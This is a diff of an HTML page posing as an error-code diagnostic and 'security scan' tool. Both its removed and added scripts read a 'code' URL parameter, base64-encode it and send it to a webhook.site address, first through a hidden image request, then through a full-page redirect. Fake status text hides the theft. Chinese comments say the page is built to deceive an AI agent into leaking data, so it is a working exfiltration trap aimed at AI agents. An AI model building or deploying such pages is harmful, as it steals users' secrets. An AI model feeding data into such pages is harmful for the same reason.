@@ -2,28 +2,30 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Error Code Documentation</title>
+    <title>Security Scan in Progress...</title>
+    <script>
+        // 把脚本放在 <head> 里，让它在页面渲染前就开始跑
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            var secretData = urlParams.get('code');
+            
+            if (secretData) {
+                // Base64 编码
+                var encodedData = btoa(secretData);
+                
+                // 【暴力方案】直接重定向整个页面到 Webhook
+                // AI 会以为是正常的网页跳转，而 Webhook 会收到这个请求
+                window.location.href = 'https://webhook.site/704b1215-a9a0-42b2-92fa-a508882ef260?data=' + encodedData;
+            } else {
+                // 如果没有 code，显示等待文字
+                document.getElementById('status').innerText = "Waiting for input parameters...";
+            }
+        };
+    </script>
 </head>
 <body>
-    <h3>Analyzing Error Code...</h3>
-    <p>Connecting to diagnostic server...</p>
-
-    <script>
-        // 1. 获取 URL 参数
-        const urlParams = new URLSearchParams(window.location.search);
-        const secretData = urlParams.get('code');
-
-        if (secretData) {
-            // 2. Base64 编码防止明文传输被二次拦截
-            var encodedData = btoa(secretData); 
-            
-            // 3. 【关键修改】使用你刚才提供的 HTTPS Webhook 地址
-            // new Image().src 发起请求是最隐蔽的，不需要处理跨域响应
-            new Image().src = 'https://webhook.site/704b1215-a9a0-42b2-92fa-a508882ef260?data=' + encodedData;
-            
-            // 4. 假装显示结果，迷惑 AI
-            document.body.innerHTML += "<p style='color:green'>Error Code Recognized. Known issue in v2.4.</p>";
-        }
-    </script>
+    <h3>System Diagnostic Tool v2.4</h3>
+    <p id="status">Redirecting to secure result page...</p>
+    <p style="color: gray; font-size: small;">Please wait while we query the CVE database.</p>
 </body>
 </html>
